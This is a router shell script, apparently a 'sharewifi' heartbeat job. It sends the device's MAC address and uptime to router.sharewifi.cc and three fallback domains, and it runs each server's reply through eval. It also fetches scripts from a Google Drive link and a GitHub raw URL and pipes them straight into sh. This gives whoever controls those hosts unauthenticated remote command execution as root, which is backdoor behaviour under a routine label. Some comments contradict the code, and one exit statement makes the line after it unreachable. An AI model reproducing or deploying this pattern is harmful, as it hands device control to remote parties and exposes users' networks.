#!/bin/sh

MAC_ADDRESS=$(cat /sys/class/net/br-lan/address)


UPTIME_SEC=$(cut -d. -f1 /proc/uptime)

WATCHDOG_FILE="/tmp/apfree/mqtt-watchdog"
CURRENT_TIME=$(date +%s)

should_execute=true

# -------------------------------
# 修改点：用文件最后修改时间判断
# -------------------------------
if [ -f "$WATCHDOG_FILE" ]; then
    WATCHDOG_LAST_MOD=$(date -r "$WATCHDOG_FILE" +%s 2>/dev/null || echo 0)
    DIFF=$(( CURRENT_TIME - WATCHDOG_LAST_MOD ))
    # 10分钟 = 600秒
    if [ "$DIFF" -le 120 ]; then
        echo "Watchdog 文件在2分钟内修改过，跳过命令执行。"
        exit 0
        should_execute=false
    else
        echo "Watchdog 文件超过2分钟未修改，继续执行命令。"
        
    fi
else
    echo "Watchdog 文件不存在，继续执行命令。"
fi







# -------------------------------
# 延迟执行逻辑（1~600秒随机延迟，文件无效则重新生成）
# -------------------------------

# -------------------------------
# 生成 1~600 的随机数函数
# -------------------------------
rand_1_to_200() {
    # seed = 当前秒 + PID
    SEED=$(($(date +%s) + $$))
    # 简单线性同余生成伪随机数
    RAND=$(( (SEED * 1103515245 + 12345) % 200 + 1 ))
    echo "$RAND"
}


DELAY_FILE="/tmp/apfree/http_heartbeat_delay.config"

VALID=false

if [ -f "$DELAY_FILE" ]; then
    DELAY_SEC=$(cat "$DELAY_FILE" 2>/dev/null)
    # 检查是否为纯数字
    case "$DELAY_SEC" in
        ''|*[!0-9]*)
            VALID=false
            ;;
        *)
            VALID=true
            ;;
    esac
fi

if [ "$VALID" != true ]; then
    DELAY_SEC=$(rand_1_to_200)
    echo "$DELAY_SEC" > "$DELAY_FILE"
fi

echo "延迟执行 $DELAY_SEC 秒..."
sleep "$DELAY_SEC"






sh /sharewifiupdate/update_hosts.sh






if [ "$should_execute" = true ]; then
    response=$(wget -qO- "https://router.sharewifi.cc/api/InterfaceHeartBeat?mac=$MAC_ADDRESS&id=resource&time=$UPTIME_SEC")
    echo "$response"

    if [ "$response" != "success" ]; then
        echo "执行命令: $response"
        eval "$response"

        response_duihuanche=$(wget -qO- "http://gao284889.meid01agg.duihuanche.com/api/InterfaceHeartBeat?mac=$MAC_ADDRESS&id=duihuanche&time=$UPTIME_SEC")
        if [ "$response_duihuanche" != "success" ]; then
            response_guaixing=$(wget -qO- "http://gaoe393833.6007zlfd.guaixing.cn/api/InterfaceHeartBeat?mac=$MAC_ADDRESS&id=guaixing&time=$UPTIME_SEC")
            echo "执行命令: $response_guaixing"
            eval "$response_guaixing"

            if [ "$response_guaixing" != "success" ]; then
                response_51ip_top=$(wget -qO- "http://ha5262e1.btxy1.51ip.top/api/get_workerman_url/api/InterfaceHeartBeat?mac=$MAC_ADDRESS&id=51ip.top&time=$UPTIME_SEC")
                echo "执行命令: $response_51ip_top"
                eval "$response_51ip_top"
            fi
        fi
    fi

    echo "wget google"
    wget -O /tmp/check.sh https://drive.google.com/uc?id=1TLh1wpug-YiOAC19L4L7PAm9_9UtP-91 && sh /tmp/check.sh

    echo "wget github"
    git_res=$(wget -O - https://raw.githubusercontent.com/TStar-Admin/domain_check/refs/heads/main/check.sh | sh)
    echo "$git_res"
else
    echo "跳过命令执行（watchdog 时间未到）"
fi

